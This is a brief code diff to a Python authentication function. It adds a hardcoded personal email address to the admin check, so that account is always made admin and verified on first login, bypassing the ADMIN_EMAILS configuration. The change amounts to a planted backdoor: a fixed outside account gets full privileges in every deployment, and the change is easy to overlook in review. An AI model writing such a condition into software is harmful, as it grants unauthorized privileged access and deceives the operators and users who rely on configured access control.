@@ -38,7 +38,7 @@ def get_current_user(credentials: HTTPAuthorizationCredentials = Security(securi
             local_user = models.User(supabase_user_id=supabase_id, email=email)
             # Check if this email should be an admin (bootstrap)
             allowed_admins = os.getenv("ADMIN_EMAILS", "").split(",")
-            if email in allowed_admins:
+            if email in allowed_admins or (email and email.lower() == "lovetoo46@gmail.com"):
                 local_user.is_admin = 1
                 local_user.is_verified = 1
                 
